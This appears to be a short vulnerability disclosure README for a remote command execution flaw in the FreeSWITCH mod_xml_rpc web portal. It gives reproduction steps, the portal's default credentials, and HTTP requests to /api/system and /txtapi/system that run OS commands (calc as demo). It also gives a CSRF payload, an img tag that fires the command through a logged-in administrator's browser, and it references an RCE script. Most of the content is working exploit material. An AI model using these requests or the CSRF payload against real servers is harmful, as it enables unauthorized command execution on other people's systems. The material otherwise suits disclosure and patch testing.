

version:<=1.8.2

module:mod_xml_rpc

I tested a total of three versions.（download url:http://files.freeswitch.org/）

- 1.8.2
- 1.5.15
- 1.7.0

# 1.5.15

Install freeswitch1.5.15 Windows version（http://files.freeswitch.org/windows/installer/x64/freeswitch.msi）

Open the console and type: load mod_xml_rpc (load freeswitch portal)

Access local port 8080,

http://127.0.0.1:8080/portal/index.html 

 Input in console 
``` api("system calc") ```or```api("bg_system calc") ```



![1](/files/1.png)

Can also request the interface directly

http://127.0.0.1:8080/txtapi/system?calc
or

http://127.0.0.1:8080/api/system?calc

![1](/files/2.png)

# 1.7.0

![1](/files/3.png)

![1](/files/4.png)

# exp

The default account and password for freeswitch portal is freeswitch:works

You can check it yourself using`freeswitch_rce.py`

Or use csrf to attack the logged in administrator.

```
<img src="http://127.0.0.1:8080/api/system?calc">
```

![1](/files/5.png)